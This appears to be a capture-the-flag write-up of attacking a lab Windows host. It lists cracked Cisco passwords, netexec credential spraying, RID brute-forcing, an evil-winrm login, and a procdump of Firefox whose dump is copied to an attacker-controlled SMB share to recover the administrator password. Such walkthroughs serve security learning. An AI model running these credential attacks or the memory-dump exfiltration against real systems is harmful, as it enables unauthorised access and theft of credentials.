# Enumeration
---
## Port 80
- In **Guest Login** page of login page:
	- ![[Pasted image 20250816055152.png]]
- In the config file:
	- ![[Pasted image 20250816055442.png]]
	- Cracked using hashcat (md5crypt - cisco-IOS)
		- ![[Pasted image 20250816055512.png]]
	- `stealth1agent`
- With further research, the other 2 are **weak Cisco Type 7 Encrypted Passwords** which can be reverse easily:
	- `rout3r` : `0242114B0E143F015F5D1E161713` : `$uperP@ssword`
	- `admin`: `02375012182C1A1D751618034F36415408` : `Q4)sJu\Y8qz*A3?d`
	- ![[Pasted image 20250816061119.png]]
# Netexec
----
- Make list of these users and passwords, then run netexec:
	- `netexec smb 10.10.10.149 -u users.txt -p passwords.txt`
	- ![[Pasted image 20250816065233.png]]
- `hazard` : `stealth1agent`

# Bruteforcing RIDs
---
- This still, does not give any access on the machine
- So we try to bruteforce RIDs:
	- `netexec smb 10.10.10.149 -u hazard -p stealth1agent --rid-brute `
- This reveals 3 new users:
	- ![[Pasted image 20250816070422.png]]
- Try netexec again:
	- ![[Pasted image 20250816070616.png]]
- `chase`:`Q4)sJu\Y8qz*A3?d`

# Initial Foothold
---
- We can use `evil-winrm` to login:
	- `evil-winrm -u chase -p 'Q4)sJu\Y8qz*A3?d' -i 10.10.10.149`
	- ![[Pasted image 20250816070741.png]]
# Privilege Escaltion
---
- Search for processing using:
	- `ps` on meterpreter
- This reveals firefox running:
	- ![[Pasted image 20250816080113.png]]
- Dump the process using procdump and transfer:
	- `.\procdump.exe -ma 6320 firefox.dmp -accepteula`
	-  Copy on smbserver using:
		- `Copy-Item .\firefox.dmp \\10.10.16.3\share\firefox.dmp`

- Read the  dmp file:
	- `strings firefox.dmp | less`
	- ![[Pasted image 20250816080222.png]]
- This is the administrator password:
	- ![[Pasted image 20250816080248.png]]
